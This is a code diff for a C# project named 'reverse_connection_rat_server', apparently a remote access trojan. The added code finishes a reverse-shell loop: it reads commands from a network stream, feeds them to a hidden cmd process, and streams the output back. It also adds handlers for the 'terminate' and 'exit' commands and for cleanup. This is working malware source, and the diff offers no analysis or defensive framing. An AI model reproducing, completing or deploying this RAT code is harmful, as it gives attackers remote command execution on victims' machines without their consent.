@@ -6,6 +6,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Linq.Expressions;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
@@ -69,11 +70,59 @@ namespace reverse_connection_rat_server
                 processCMD.Start();
                 processCMD.BeginErrorReadLine();
             }
+
+            while (true)
+            {
+                try
+                {
+                    strInput.Append(streamReader.ReadLine());
+                    strInput.Append("\n");
+                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
+                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
+                    processCMD.StandardInput.WriteLine(strInput);
+                    strInput.Remove(0, strInput.Length);
+                }
+                catch (Exception err)
+                {
+                    Cleanup();
+                    break;
+
+                }
+            }
         }
 
-        private void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
+        private void Cleanup()
         {
-            throw new NotImplementedException();
+            try
+            {
+                processCMD.Kill();
+            }
+            catch (Exception err)
+            {                
+            }
+        }
+
+        private void StopServer()
+        {
+            Cleanup();
+            System.Environment.Exit(System.Environment.ExitCode);
+        }
+
+        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err)
+                {                    
+                }
+            }
         }
     }
 }
